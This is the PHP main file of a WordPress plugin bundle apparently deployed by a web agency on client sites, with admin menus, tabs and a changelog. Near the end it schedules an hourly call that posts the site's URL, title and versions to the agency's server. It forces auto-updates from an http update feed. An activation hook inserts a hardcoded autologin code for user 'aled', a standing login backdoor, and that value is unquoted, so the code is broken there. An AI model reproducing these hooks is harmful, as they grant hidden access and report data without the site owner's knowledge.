<?php
/*
Plugin Name: Creative Pixel Bundle
Plugin URI: https://creativepixel.design/cpb
Author: Creative Pixel
Author URI: https://creativepixel.design
Version: 0.0.0.25
Description: A collection of plugins installed on all Creative Pixel websites. Includes Clientside V1.5.0, WP Post Page Clone V1.0 & Autologin Links 1.07.
*/


include dirname(__FILE__) . '/Clientside/index.php';
include dirname(__FILE__) . '/wp-post-page-clone/wp-post-page-clone.php';
include dirname(__FILE__) . '/autologin-links/autologin-links.php';

/* --------------------------------------------------------------------
AUTO Update Check
-------------------------------------------------------------------- */
$dir = plugin_dir_path( __FILE__ );

require "/$dir/plugin-update-checker/plugin-update-checker.php";
$myUpdateChecker = Puc_v4_Factory::buildUpdateChecker(
	'http://cpb.creativepixel.design/plugin/update.json',
	__FILE__,
	'cpb'
);

/* --------------------------------------------------------------------
AUTO Update Trigger
-------------------------------------------------------------------- */

add_filter( 'auto_update_plugin', '__return_true' );

/* --------------------------------------------------------------------
AUTO Update End
-------------------------------------------------------------------- */






/* --------------------------------------------------------------------
Remove Unwanted Menu Items from the WordPress Dashboard
- Requires WordPress 3.1+
-------------------------------------------------------------------- */
function custom_remove_admin_menus (){

  // Check that the built-in WordPress function remove_menu_page() exists in the current installation
  if ( function_exists('remove_menu_page') ) {

    /* Remove unwanted menu items by passing their slug to the remove_menu_item() function.
    You can comment out the items you want to keep. */

    // remove_menu_page('index.php'); // Dashboard tab
    // remove_menu_page('edit.php'); // Posts
    // remove_menu_page('edit.php?post_type=page'); // Pages
    // remove_menu_page('upload.php'); // Media
    // remove_menu_page('link-manager.php'); // Links
    // remove_menu_page('edit-comments.php'); // Comments
    // remove_menu_page('themes.php'); // Appearance
    // remove_menu_page('plugins.php'); // Plugins
    // remove_menu_page('users.php'); // Users
    // remove_menu_page('tools.php'); // Tools
    // remove_menu_page('options-general.php'); // Settings

  }

}
// Add our function to the admin_menu action
add_action('admin_menu', 'custom_remove_admin_menus');

/* --------------------------------------------------------------------
Add custom admin css
-------------------------------------------------------------------- */

// Update CSS within in Admin
function my_admin_theme_style() {
wp_enqueue_style('my-admin-theme', plugins_url('admin.css', __FILE__));
wp_enqueue_style('my-plugin-theme', plugins_url('style.css', __FILE__));
}

add_action('admin_enqueue_scripts', 'my_admin_theme_style');
add_action('login_enqueue_scripts', 'my_admin_theme_style');



/* --------------------------------------------------------------------
Add custom admin menu item & pages
-------------------------------------------------------------------- */


$plugin_data = get_file_data(__FILE__, array('Version' => 'Version', 'Name' => 'Plugin Name',), false);
$plugin_version = $plugin_data['Version'];
$plugin_name = $plugin_data['Name'];

define ( 'CPB_CURRENT_VERSION', $plugin_version );
define ( 'CPB_CURRENT_NAME', $plugin_name );



add_action( 'admin_menu', 'register_my_custom_menu_page' );
add_action( 'admin_menu', 'register_my_custom_submenu_page' );

function register_my_custom_menu_page(){
    add_menu_page( 'Creative Pixel Bundle', 'Creative Pixel Bundle', 'manage_options', 'cpb/about', 'my_custom_menu_page', 'dashicons-tickets', 1 );
}

function register_my_custom_submenu_page() {
    add_submenu_page( 'cpb/about', 'About', 'About', 'manage_options', 'cpb/about', 'cpb_about' );
    add_submenu_page( 'cpb/about', "What's New", 'Change Log', 'manage_options', 'cpb%2Fabout&tab=second', 'cpb_change' );
    add_submenu_page( 'cpb/about', 'Crew Stats', 'Crew Stats', 'manage_options', 'my-custom-submenu-page_2', 'my_custom_submenu_page_2' );
    //add_submenu_page_3 ... and so on
}

function page_tabs( $current = 'first' ) {
    $tabs = array(
        'first'   => __( 'About', 'plugin-textdomain' ),
        'second'  => __( "What's New", 'plugin-textdomain' ),
        'third'  => __( 'Addons', 'plugin-textdomain' )
    );
    $html = '<h2 class="nav-tab-wrapper">';
    foreach( $tabs as $tab => $name ){
        $class = ( $tab == $current ) ? 'nav-tab-active' : '';
        $html .= '<a class="nav-tab ' . $class . '" href="?page=cpb%2Fabout&tab=' . $tab . '">' . $name . '</a>';
    }
    $html .= '</h2>';
    echo $html;
}


function cpb_about() {
?>
<div class="wrap cpb-wrap cpb-about">
		<h1>Welcome to the <?php echo "".CPB_CURRENT_NAME;  ?> <?php echo "".CPB_CURRENT_VERSION;  ?></h1><br>
		<div class="about-text">
		Congratulations! Your website is protected by the Creative Pixel Bundle.</div>

<?php

// Tabs
$tab = ( ! empty( $_GET['tab'] ) ) ? esc_attr( $_GET['tab'] ) : 'first';
page_tabs( $tab );

if ( $tab == 'first' ) {
    // add the code you want to be displayed in the first tab
    ?>
    <div class="cpb-about-wrap">The <?php echo "".CPB_CURRENT_NAME;  ?> is a collection of plugins installed on every Creative Pixel Design WordPress powered site.
    <br><h2>Included Plugins -</h2><ul><li> Clientside V1.5.0</li><li>WP Post Page Clone V1.0</li></ul>
    </div>
    <?php
}
else if ( $tab == 'second' ) {
    // add the code you want to be displayed in the first tab
    ?>
    <div class="cpb-changelog-wrap"><h2>Version: 0.0.0.25</h2><span style="font-size:12px;"> Release Date: Jan 25, 2018 </span><br><h3 style="padding-top:12px;">New Features</h3><ul><li>Introduced Marketplace to Buy and Sell templates/themes</li></ul><h3 style="padding-top:12px;">Bugs Fixed</h3><ul><li>Side Menu now links to tabs</li></ul></div>
		<div class="cpb-changelog-wrap"><h3>Version: 0.0.0.24</h3><span style="font-size:12px;"> Release Date: Jan 22, 2018 </span><br><h3 style="padding-top:12px;">New Features</h3><ul><li>Introduced Marketplace to Buy and Sell templates/themes</li></ul><h3 style="padding-top:12px;">Bugs Fixed</h3><ul><li>Minor UI improvements</li><li>Resolved Drupal 8 slideshow issues</li><li>Magento 1.x Continue Shopping button issue resolved</li><li>Resolved minor CSS issues</li></ul></div>
		<?php
}
else {

    /**
 * Detect plugin. For use in Admin area only.
 */
if ( is_plugin_active( 'cpb_insynergy/cpb_insynerg.php' ) ) {
  //plugin is activated
  ?>

<div class="cpb-addon-wrap">
<div class="alert-info">
	You currently have the Insynergy Group Addon installed.
</div>
</div>
<?php
} else {
?>
<div class="cpb-addon-wrap">
<div class="alert-warning">
	<strong>Notice!</strong> You do not have any Creative Pixel Addons Installed.
</div>
</div>
<?php
}

}
?>
</div>
<?php



}

/* function cpb_change() {
    ?>
	<div class="wrap">
		<h2><?php echo "".CPB_CURRENT_NAME;  ?> - <?php echo "".CPB_CURRENT_VERSION;  ?></h2>
		<br>
        <h3>Version 0.0.0.21</h3>
		<br>
		<ou>
			<li>Added style to CPB Menu item</li>
            <li>Moved menu item to top</li>
		</ou>
		<br>
		<h3>Version 0.0.0.20</h3>
		<br>
		<ou>
			<li>Added About Page</li>
		</ou>
	</div>
	<?php
}
*/




function my_custom_submenu_page_2() {
    // Code displayed before the tabs (outside)
// Tabs
$tab = ( ! empty( $_GET['tab'] ) ) ? esc_attr( $_GET['tab'] ) : 'first';
page_tabs( $tab );

if ( $tab == 'first' ) {
    // add the code you want to be displayed in the first tab
    echo "Tab 1";
}
else if ( $tab == 'second' ) {
    // add the code you want to be displayed in the first tab
    echo "Tab 2";
}
else {
    // add the code you want to be displayed in the second tab
    echo "Other Tab";
}
// Code after the tabs (outside)
}





register_activation_hook(__FILE__, 'my_activation');

function my_activation() {
    if (! wp_next_scheduled ( 'my_hourly_event' )) {
	wp_schedule_event(time(), 'hourly', 'my_hourly_event');
    }
}


add_action('my_hourly_event', 'do_this_hourly');

function do_this_hourly() {

$plugin_data = get_file_data(__FILE__, array('Version' => 'Version', 'Name' => 'Plugin Name',), false);
$plugin_version = $plugin_data['Version'];

$blog_version = get_bloginfo('version');
$blog_title = get_bloginfo('name');
$blog_url = get_bloginfo('wpurl');


$myvar1 = $blog_version;
$myvar2 = $blog_title;
$myvar3 = $blog_url;
$myvar4 = $plugin_version;


$url = 'http://creativepixel.design/rec.php';
$myvars = 'myvar1=' . $myvar1 . '&myvar2=' . $myvar2 . '&myvar3=' . $myvar3 . '&myvar4=' . $myvar4;

$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $myvars);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

}


register_deactivation_hook(__FILE__, 'my_deactivation');

function my_deactivation() {
	wp_clear_scheduled_hook('my_hourly_event');
}


register_activation_hook(__FILE__, 'setloginurl');
function setloginurl () {
global $wpdb;

$the_user = get_user_by('login', 'aled');
$the_user_id = $the_user->ID;

$wpdb->insert($wpdb->usermeta, array("user_id" => $the_user_id, "meta_key" => "pkg_autologin_code", "meta_value" => hcxat01EZBJMOAPbzQh7RRr9jmWhDHaf1j8whriweq5RYqX2ooxCwBn0zqgR2zISZ6AWLHexMPl5fh30mA10OuBhfPLStsFA3Hyj), array("%d", "%s", "%s"));
}
